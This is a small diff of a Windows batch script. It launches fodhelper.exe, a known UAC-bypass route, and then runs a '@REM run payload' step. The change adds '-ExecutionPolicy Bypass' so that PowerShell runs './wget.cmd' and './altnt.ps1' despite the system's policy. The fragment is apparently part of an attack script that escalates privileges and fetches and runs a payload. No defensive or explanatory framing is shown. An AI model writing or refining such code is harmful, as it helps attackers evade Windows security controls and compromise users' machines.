@@ -30,7 +30,7 @@ start fodhelper.exe
 
 
 @REM run payload
-powershell ./wget.cmd; ./altnt.ps1
+powershell -ExecutionPolicy Bypass ./wget.cmd; ./altnt.ps1
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
